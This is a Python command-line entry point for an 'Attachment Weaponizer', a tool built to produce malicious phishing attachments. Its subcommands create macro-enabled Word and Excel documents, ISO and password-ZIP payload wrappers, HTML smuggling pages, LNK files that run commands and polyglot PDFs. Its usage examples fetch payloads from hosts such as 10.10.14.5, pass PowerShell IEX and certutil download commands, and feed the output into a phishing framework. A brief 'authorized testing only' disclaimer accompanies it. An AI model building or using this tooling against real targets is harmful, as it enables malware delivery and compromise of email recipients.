"""
Main entry point for attachment weaponizer
"""
import sys
import argparse
from pathlib import Path
from .core.weaponizer import AttachmentWeaponizer

def main():
    """Main CLI entry point"""
    parser = argparse.ArgumentParser(
        description='Attachment Weaponizer - Create malicious attachments for phishing',
        epilog='⚠️  For authorized security testing only'
    )
    
    parser.add_argument('--output-dir', default='weaponized_attachments',
                       help='Output directory for attachments')
    
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Macro document command
    doc_parser = subparsers.add_parser('macro-doc', help='Create macro Word document')
    doc_parser.add_argument('macro_code', help='Path to VBA macro code')
    doc_parser.add_argument('--output', default='document.docm', help='Output filename')
    
    # Macro Excel command
    excel_parser = subparsers.add_parser('macro-excel', help='Create macro Excel document')
    excel_parser.add_argument('macro_code', help='Path to VBA macro code')
    excel_parser.add_argument('--output', default='spreadsheet.xlsm', help='Output filename')
    
    # ISO command
    iso_parser = subparsers.add_parser('iso', help='Create ISO file')
    iso_parser.add_argument('payload', help='Path to payload file')
    iso_parser.add_argument('--output', default='document.iso', help='Output filename')
    
    # Password ZIP command
    zip_parser = subparsers.add_parser('password-zip', help='Create password-protected ZIP')
    zip_parser.add_argument('file', help='Path to file to archive')
    zip_parser.add_argument('--password', help='ZIP password (generated if not provided)')
    zip_parser.add_argument('--output', default='document.zip', help='Output filename')
    
    # HTML smuggling command
    html_parser = subparsers.add_parser('html-smuggling', help='Create HTML smuggling file')
    html_parser.add_argument('payload_url', help='URL of payload to download')
    html_parser.add_argument('--output', default='document.html', help='Output filename')
    
    # LNK command
    lnk_parser = subparsers.add_parser('lnk', help='Create malicious LNK file')
    lnk_parser.add_argument('command', help='Command to execute')
    lnk_parser.add_argument('--output', default='document.lnk', help='Output filename')
    
    # Polyglot command
    poly_parser = subparsers.add_parser('polyglot', help='Create polyglot file')
    poly_parser.add_argument('payload', help='Path to payload file')
    poly_parser.add_argument('--output', default='document.pdf', help='Output filename')
    
    # List command
    subparsers.add_parser('list', help='List all created attachments')
    
    # Examples command
    subparsers.add_parser('examples', help='Show usage examples')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    # Initialize weaponizer
    weaponizer = AttachmentWeaponizer(args.output_dir)
    
    # Execute command
    if args.command == 'macro-doc':
        weaponizer.create_macro_doc(args.macro_code, args.output)
    
    elif args.command == 'macro-excel':
        weaponizer.create_macro_excel(args.macro_code, args.output)
    
    elif args.command == 'iso':
        weaponizer.create_iso(args.payload, args.output)
    
    elif args.command == 'password-zip':
        weaponizer.create_password_zip(args.file, args.password, args.output)
    
    elif args.command == 'html-smuggling':
        weaponizer.create_html_smuggling(args.payload_url, args.output)
    
    elif args.command == 'lnk':
        weaponizer.create_lnk(args.command, args.output)
    
    elif args.command == 'polyglot':
        weaponizer.create_polyglot(args.payload, args.output)
    
    elif args.command == 'list':
        weaponizer.print_summary()
    
    elif args.command == 'examples':
        show_examples()
    
    # Print summary
    if args.command not in ['list', 'examples']:
        print("\n" + "="*80)
        weaponizer.print_summary()

def show_examples():
    """Show usage examples"""
    examples = """
Attachment Weaponizer - Usage Examples

1. Create macro Word document:
   python -m attachment_weaponizer macro-doc payload.vba
   python -m attachment_weaponizer macro-doc payload.vba --output invoice.docm

2. Create macro Excel spreadsheet:
   python -m attachment_weaponizer macro-excel payload.vba
   python -m attachment_weaponizer macro-excel payload.vba --output report.xlsm

3. Create ISO file:
   python -m attachment_weaponizer iso payload.exe
   python -m attachment_weaponizer iso payload.exe --output software.iso

4. Create password-protected ZIP:
   python -m attachment_weaponizer password-zip payload.exe
   python -m attachment_weaponizer password-zip document.pdf --password 2024

5. Create HTML smuggling file:
   python -m attachment_weaponizer html-smuggling http://10.10.14.5/payload.exe
   python -m attachment_weaponizer html-smuggling http://server.com/payload.exe --output view.html

6. Create malicious LNK file:
   python -m attachment_weaponizer lnk "powershell -c IEX(...)"
   python -m attachment_weaponizer lnk "cmd /c certutil -urlcache..."

7. Create polyglot file:
   python -m attachment_weaponizer polyglot payload.exe
   python -m attachment_weaponizer polyglot payload.exe --output document.pdf

8. List created attachments:
   python -m attachment_weaponizer list

Integration with phishing framework:
   # Create attachment
   python -m attachment_weaponizer html-smuggling http://10.10.14.5/payload.exe
   
   # Use with phishing framework
   python -m phishing_framework --attach weaponized_attachments/document.html

⚠️  IMPORTANT: Use only for authorized security testing with written permission.
"""
    print(examples)

if __name__ == "__main__":
    main()